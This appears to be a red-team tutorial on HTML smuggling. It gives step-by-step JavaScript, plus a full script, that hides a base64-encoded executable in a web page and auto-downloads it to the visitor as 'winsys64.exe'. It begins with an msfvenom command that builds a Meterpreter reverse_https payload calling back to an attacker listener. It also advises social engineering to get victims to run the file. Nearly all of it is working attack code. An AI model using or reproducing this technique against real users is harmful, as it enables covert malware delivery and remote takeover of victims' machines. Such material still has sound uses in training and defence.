# Using JavaScript

Overview of steps required to embed JavaScript within an HTML document that will trigger an automatic download of a first stage payload to a target system when the web page is visited by the victim. The file still has to be saved to disk by the user and then manually executed, which will require manipulating the user to performs these tasks via social engineering and/or pretexting.

### Steps

#### Step 1:

Generate a Meterpreter shellcode windows binary.&#x20;

```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
```

Generate a base64 encoded string of the binary to help avoid invalid or bad characters.

```
base64 /var/www/html/msfstaged.exe
```

#### Step 2:

Write a base64 to byte array converter function in JavaScript to decode the shellcode into a byte array.

```javascript
function base64ToArrayBuffer(base64) { 
    var binary_string = window.atob(base64); 
    var len = binary_string.length; 
    var bytes = new Uint8Array( len ); 
    for (var i = 0; i < len; i++) { 
        bytes[i] = binary_string.charCodeAt(i); 
        } 
    return bytes.buffer; 
}
```

#### Step 3:

Create a variable to store the filename for the payload that will be saved on the target system.

```javascript
var fileName = 'winsys64.exe';
```

#### Step 4:

Store the base64 encoded payload in a variable. Remove any line breaks or new lines from the base64 encoded executable to embed it as one continuous string (alternatively, wrap each line in quotes).

```javascript
var file ='TvqQAAMAAAAEAAAA//8AAAA…’ <--base64 encoded binary
```

#### Step 5:

Convert the encoded shellcode into a bytearray and store in a new variable.

```javascript
var data = base64ToArrayBuffer(file);a
```

#### Step 6:

To use the HTML5 download attribute, create a blob object and instantiate it with the payload byte array.

```javascript
var blob = new Blob([data], {type: 'octet/stream'});
```

#### Step 7:

Create a URL file object using the blob object. This simulates a file located on the web server, but instead reads it from memory.

```javascript
var url = window.URL.createObjectURL(blob);
```

#### Step 8:

Create the new anchor object and append it to the HTML document. Set the display attribute to none to hide it from the output of the rendered page.

```javascript
var a = document.createElement('a'); 
document.body.appendChild(a); 
a.style = 'display: none';
```

#### Step 9:

Set the href tag to the URL file object created in step 7.

```javascript
a.href = url;
```

#### Step 10:

Set the download attribute by specifying the filename to store the payload in. Use the click() method to trigger the download onto the target machine.

```javascript
a.download = fileName; 
a.click();
```

Step 11:

Finally, let the browser know that you are finished with the URL object so it knows not to keep the reference to the file any longer.

```javascript
window.URL.revokeObjectURL(url);
```

### Full script (Chrome)

```javascript
<script>
function base64ToByteArray(enc) { 
    var binary_string = window.atob(enc); 
    var len = binary_string.length; 
    var byteArray = new Uint8Array( len ); 
    for (var i = 0; i < len; i++) { 
        byteArray[i] = binary_string.charCodeAt(i); 
        } 
    return byteArray.buffer; 
}
var outName = 'winsys64.exe';
var payL ='TvqQAAMAAAAEAAAA//8AAAA…   <--base64 encoded binary (truncated)->
var stream = base64ToByteArray(payL);
var blobby = new Blob([stream], {type: 'octet/stream'});
var urlRef = window.URL.createObjectURL(blobby);

var anc = document.createElement('a');
document.body.appendChild(anc);
anc.style = 'display: none';
anc.href = urlRef;
anc.download = outName;
anc.click();
window.URL.revokeObjectURL(urlRef);
</script>
```







